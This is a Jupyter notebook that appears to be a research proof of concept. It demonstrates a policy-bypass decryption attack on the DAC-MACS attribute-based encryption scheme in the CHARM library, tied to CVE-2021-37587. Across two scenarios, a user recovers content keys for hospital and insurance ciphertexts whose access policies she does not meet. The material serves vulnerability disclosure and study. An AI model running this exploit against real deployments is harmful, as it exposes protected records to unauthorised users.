{
 "cells": [
  {
   "cell_type": "markdown",
   "id": "8ced444a",
   "metadata": {},
   "source": [
    "\n",
    "# Attacking DAC-MACS\n",
    "\n",
    "This module contains methods to attack a DAC-MACS implementation\n",
    "based on https://eprint.iacr.org/2020/460.\n",
    "\n",
    "It supposes that the user knows x_2 and a complete decryption attack \n",
    "can be mounted as described in CVE-2021-37587. It then recovers e(g, g)^{\\ alpha_i \\cdot s} and decrypts any ciphertext in the system with independence of the policy.\n",
    "\n",
    "The following scenario is considered:\n",
    "\n",
    "![title](img/dacmacs_main.png)\n"
   ]
  },
  {
   "cell_type": "markdown",
   "id": "a7a16327",
   "metadata": {},
   "source": [
    "## Setup\n",
    "\n",
    "We import the needed CHARM classes and the attack module, abeattacks."
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "id": "d7db6d21",
   "metadata": {},
   "outputs": [],
   "source": [
    "from charm.toolbox.pairinggroup import PairingGroup,ZR,G1,GT,pair\n",
    "from charm.toolbox.secretutil import SecretUtil\n",
    "from charm.toolbox.ABEncMultiAuth import ABEncMultiAuth\n",
    "from charm.schemes.abenc.abenc_dacmacs_yj14 import DACMACS\n",
    "\n",
    "from abeattacks import attack_dac_mac\n"
   ]
  },
  {
   "cell_type": "markdown",
   "id": "038f3552",
   "metadata": {},
   "source": [
    "## System Generation\n",
    "\n",
    "Alice is a user of the system. She obtains the attribute DOCTOR from the Hospital KGA\n",
    "and the attribute CONSULTANT from the Insurance company KGA. \n",
    "\n",
    "The data owner prepares a ciphertext that Alice cannot decrypt, with access policy\n",
    "\"DOCTOR and GENETICS\"."
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "id": "54d8a581",
   "metadata": {},
   "outputs": [],
   "source": [
    "# Global Authority setup\n",
    "\n",
    "groupObj = PairingGroup('SS512')\n",
    "dac = DACMACS(groupObj)\n",
    "GPP, GMK = dac.setup()\n",
    "\n",
    "users = {} \n",
    "authorities = {}\n",
    "\n",
    "# Hospital KGA setup\n",
    "\n",
    "authorityAttributes = [\"DOCTOR\", \"NURSE\", \"NEUROLOGY\", \"GENETICS\", \"Mayo Clinic\", \"Central Hospital\"]\n",
    "authority1 = \"Hospital KGA\"\n",
    "\n",
    "dac.setupAuthority(GPP, authority1, authorityAttributes, authorities)\n",
    "\n",
    "# Insurance KGA setup\n",
    "\n",
    "authorityAttributes2 = [\"FINANCE\", \"CONSULTANT\", \"OPERATIONS\", \"Downtown\", \"Market\"]\n",
    "authority2 = \"Insurance KGA\"\n",
    "\n",
    "dac.setupAuthority(GPP, authority2, authorityAttributes2, authorities)\n",
    "\n",
    "# User Alice registration and setup\n",
    "\n",
    "alice = { 'id': 'alice', 'authoritySecretKeys1': {},  'authoritySecretKeys2': {}, 'keys': None }\n",
    "alice['keys'], users[alice['id']] = dac.registerUser(GPP)\n",
    "USK_t_alice = dac.keygen(GPP, authorities[authority1], \"DOCTOR\", users[alice['id']], alice['authoritySecretKeys1'])\n",
    "USK_t_alice2 = dac.keygen(GPP, authorities[authority2], \"CONSULTANT\", users[alice['id']], alice['authoritySecretKeys2'])\n",
    "\n",
    "# Data owner setup\n",
    "\n",
    "## Encryption key generation \n",
    "k1 = groupObj.random(GT)\n",
    "\n",
    "## It encrypts the content key with the following policy\n",
    "## within the system\n",
    "\n",
    "policy_str = \"DOCTOR and GENETICS\"\n",
    "CT1 = dac.encrypt(GPP, policy_str, k1, authorities[authority1])\n"
   ]
  },
  {
   "cell_type": "markdown",
   "id": "0dba2d67",
   "metadata": {},
   "source": [
    "## Attack 1\n",
    "\n",
    "Alice decrypts a ciphertext for her, but she does not satisfy the policy e.g. DOCTOR vs (DOCTOR and GENETICS)   "
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "id": "e4fad54c",
   "metadata": {},
   "outputs": [],
   "source": [
    "# We prepare Alice parameters that are needed for the attack\n",
    "\n",
    "x_1 = alice['keys'][1]\n",
    "x_2 = users[alice['id']]['u']\n",
    "p_1 = USK_t_alice['K']\n",
    "p_2 = CT1['C2'] \n",
    "\n",
    "pair_ = attack_dac_mac.dac_mac_compute_pairing(p_1, p_2, x_1)\n",
    "egg = attack_dac_mac.dac_mac_get_egg(pair_, GPP['g_a'], CT1['C2'], x_1, x_2, USK_t_alice['R'], CT1['C3'])\n"
   ]
  },
  {
   "cell_type": "markdown",
   "id": "17d55fb8",
   "metadata": {},
   "source": [
    "## Validation"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "id": "8758dc25",
   "metadata": {},
   "outputs": [],
   "source": [
    "verify_1 = CT1['C1'] / k1\n",
    "assert verify_1 == egg, 'FAILED ATTACK' \n",
    "print('We can recover egg')"
   ]
  },
  {
   "cell_type": "markdown",
   "id": "8d342f81",
   "metadata": {},
   "source": [
    "## Decryption attack"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "id": "6bbdb69c",
   "metadata": {},
   "outputs": [],
   "source": [
    "k_recover = CT1['C1']/egg\n",
    "assert k1 == k_recover, 'FAILED DECRYPTION ATTACK'\n",
    "print('DECRYPTION ATTACK SUCCESFUL: We can recover the content key k1.')"
   ]
  },
  {
   "cell_type": "markdown",
   "id": "0a6ad790",
   "metadata": {},
   "source": [
    "# Attack 2\n",
    "\n",
    "Bob is another user of the system, mainly workign with the Insurance KGA. He obtained\n",
    "the attribute FINANCE. The data owner prepared a ciphertext for bob with the policy\n",
    "FINANCE or OPERATIONS. Alice will be able to decrypt this ciphertext, even she cannot\n",
    "fulfill the access policy."
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "id": "c4dafdc2",
   "metadata": {},
   "outputs": [],
   "source": [
    "# Bob user registration\n",
    "\n",
    "bob = { 'id': 'bob', 'authoritySecretKeys1': {},  'authoritySecretKeys2': {}, 'keys': None }\n",
    "bob['keys'], users[bob['id']] = dac.registerUser(GPP)\n",
    "USK_t_bob = dac.keygen(GPP, authorities[authority2], \"FINANCE\", users[bob['id']], bob['authoritySecretKeys1'])\n",
    "\n",
    "# Data owner setup for Bob\n",
    "\n",
    "## generation of the content key and policy\n",
    "k_bob = groupObj.random(GT)\n",
    "policy_bob = '(FINANCE or OPERATIONS)'\n",
    "ct_bob = dac.encrypt(GPP, policy_bob, k_bob, authorities[authority2])\n",
    "\n",
    "# alice decrypts bob ciphertext even if she does not have the attributes FINANCE or OPERATIONS\n",
    "\n",
    "p_1 = USK_t_alice2['K'] \n",
    "x_1 = alice['keys'][1] \n",
    "x_2 = users[alice['id']]['u'] \n",
    "\n",
    "p_2 = ct_bob['C2'] \n",
    "\n",
    "# attack\n",
    "\n",
    "pair_ = attack_dac_mac.dac_mac_compute_pairing(p_1, p_2, x_1)\n",
    "egg = attack_dac_mac.dac_mac_get_egg(pair_, GPP['g_a'], ct_bob['C2'], x_1, x_2, USK_t_alice2['R'], ct_bob['C3'])\n",
    "k_bob_recover = ct_bob['C1']/egg"
   ]
  },
  {
   "cell_type": "markdown",
   "id": "4a740fff",
   "metadata": {},
   "source": [
    "## Validation\n"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "id": "45f327e9",
   "metadata": {},
   "outputs": [],
   "source": [
    "assert k_bob == k_bob_recover, 'FAILED ATTACK AGAINST BOB'\n",
    "print('ATTACK AGAINST BOB SUCCESFUL')"
   ]
  }
 ],
 "metadata": {
  "kernelspec": {
   "display_name": "Python 3 (ipykernel)",
   "language": "python",
   "name": "python3"
  },
  "language_info": {
   "codemirror_mode": {
    "name": "ipython",
    "version": 3
   },
   "file_extension": ".py",
   "mimetype": "text/x-python",
   "name": "python",
   "nbconvert_exporter": "python",
   "pygments_lexer": "ipython3",
   "version": "3.9.5"
  }
 },
 "nbformat": 4,
 "nbformat_minor": 5
}
